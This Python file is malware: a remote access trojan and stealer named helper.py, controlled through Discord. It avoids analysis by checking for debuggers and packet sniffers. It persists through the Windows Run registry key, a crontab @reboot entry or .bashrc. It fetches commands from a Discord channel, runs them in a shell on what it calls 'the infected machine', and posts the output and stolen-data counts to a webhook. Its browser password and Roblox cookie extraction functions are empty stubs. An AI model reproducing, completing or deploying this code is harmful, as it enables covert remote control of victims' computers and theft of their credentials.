# helper.py
import requests
import os
import base64
import subprocess
import json
import time
import shutil
from datetime import datetime, timedelta
from cryptography.fernet import Fernet
from config import DISCORD_WEBHOOK_URL, DISCORD_BOT_TOKEN, COMMAND_CHANNEL_ID

# In-memory data storage
INTERNAL_DATA = {
    "status": "active",
    "last_run": 0
}

def load_data():
    return INTERNAL_DATA

def save_data(data):
    global INTERNAL_DATA
    INTERNAL_DATA.update(data)

# Encryption
key = Fernet.generate_key()
cipher_suite = Fernet(key)

def encrypt_data(data):
    encrypted_data = cipher_suite.encrypt(data.encode())
    return base64.b64encode(encrypted_data).decode()

def decrypt_data(encrypted_data):
    try:
        decrypted_data = cipher_suite.decrypt(base64.b64decode(encrypted_data.encode()))
        return decrypted_data.decode()
    except Exception:
        return None

def check_blacklisted_processes():
    blacklisted_processes = ['xdbg', 'ollydbg', 'FakeNet', 'wireshark', 'tcpdump']
    try:
        if os.name == 'nt':
            output = subprocess.check_output(['tasklist']).decode().lower()
        else:
            output = subprocess.check_output(['ps', 'aux']).decode().lower()
        for process in blacklisted_processes:
            if process.lower() in output:
                return True
    except Exception:
        pass
    return False

# Communication
def send_message_to_webhook(message):
    """Sends a message to the Discord channel via Webhook."""
    if not DISCORD_WEBHOOK_URL:
        return
    data = {'content': f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}"}
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=data, timeout=10)
    except Exception:
        pass

def receive_commands():
    """Retrieves commands from the Discord channel using the Bot Token."""
    if not DISCORD_BOT_TOKEN or not COMMAND_CHANNEL_ID:
        return []
    
    url = f"https://discord.com/api/v10/channels/{COMMAND_CHANNEL_ID}/messages?limit=5"
    headers = {"Authorization": f"Bot {DISCORD_BOT_TOKEN}"}
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            messages = response.json()
            return [m['content'] for m in messages]
    except Exception:
        pass
    return []

def process_command(command):
    """Executes a command on the infected machine."""
    try:
        if command.startswith("!exec "):
            cmd = command[6:]
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
            send_message_to_webhook(f"Command Output:\n```\n{output}\n```")
        elif command == "!screenshot":
            send_message_to_webhook("Screenshot command received (Not yet implemented).")
    except Exception as e:
        send_message_to_webhook(f"Command Error: {e}")

# Extraction logic
def extract_chrome_passwords(): return []
def extract_firefox_passwords(): return []
def extract_opera_passwords(): return []
def extract_edge_passwords(): return []
def extract_brave_passwords(): return []
def extract_roblox_cookies(): return []

def extract_account_info():
    return {'emails': [], 'usernames': [], 'email_passwords': []}

def extract_browser_data(browser):
    print(f"Extracting {browser}...")
    extracted_data = []
    if browser == 'chrome': extracted_data = extract_chrome_passwords()
    elif browser == 'firefox': extracted_data = extract_firefox_passwords()
    elif browser == 'opera': extracted_data = extract_opera_passwords()
    elif browser == 'edge': extracted_data = extract_edge_passwords()
    elif browser == 'brave': extracted_data = extract_brave_passwords()
    
    return {
        'passwords': extracted_data,
        'cookies': extract_roblox_cookies(),
        'accounts': extract_account_info()
    }

def ensure_persistence():
    try:
        current_script = os.path.abspath(__file__)
        if os.name == 'nt':
            appdata = os.getenv('APPDATA')
            target_dir = os.path.join(appdata, 'SystemHelper')
            if not os.path.exists(target_dir): os.makedirs(target_dir)
            target_file = os.path.join(target_dir, 'helper.exe')
            if not os.path.exists(target_file): shutil.copy2(current_script, target_file)
            import winreg
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            try:
                reg_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(reg_key, "SystemHelper", 0, winreg.REG_SZ, target_file)
                winreg.CloseKey(reg_key)
            except Exception: pass
        else:
            try:
                cron_command = f"@reboot python3 {current_script}\n"
                process = subprocess.Popen(['crontab', '-l'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, _ = process.communicate()
                current_cron = stdout.decode()
                if current_script not in current_cron:
                    new_cron = current_cron + cron_command
                    process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE)
                    process.communicate(input=new_cron.encode())
            except Exception:
                bashrc = os.path.expanduser('~/.bashrc')
                with open(bashrc, 'a') as f:
                    if current_script not in open(bashrc).read():
                        f.write(f"\npython3 {current_script} &\n")
    except Exception: pass

def main():
    if not check_blacklisted_processes():
        ensure_persistence()
        
        # Check for commands
        commands = receive_commands()
        for cmd in commands:
            process_command(cmd)
        
        # Perform extraction
        browsers = ['chrome', 'firefox', 'opera', 'edge', 'brave']
        for browser in browsers:
            data_bundle = extract_browser_data(browser)
            if data_bundle['passwords']:
                send_message_to_webhook(f"Extracted {len(data_bundle['passwords'])} passwords from {browser.capitalize()}.")
            if data_bundle['cookies']:
                send_message_to_webhook(f"Found {len(data_bundle['cookies'])} Roblox cookies in {browser.capitalize()}.")
            acc = data_bundle['accounts']
            if acc['emails'] or acc['usernames']:
                send_message_to_webhook(f"Account scan results ({browser.capitalize()}): {len(acc['emails'])} emails found.")
        
        send_message_to_webhook("System active.")
        
        data = load_data()
        data['status'] = 'active'
        data['last_run'] = time.time()
        save_data(data)

if __name__ == "__main__":
    while True:
        try:
            main()
        except Exception: pass
        time.sleep(60)
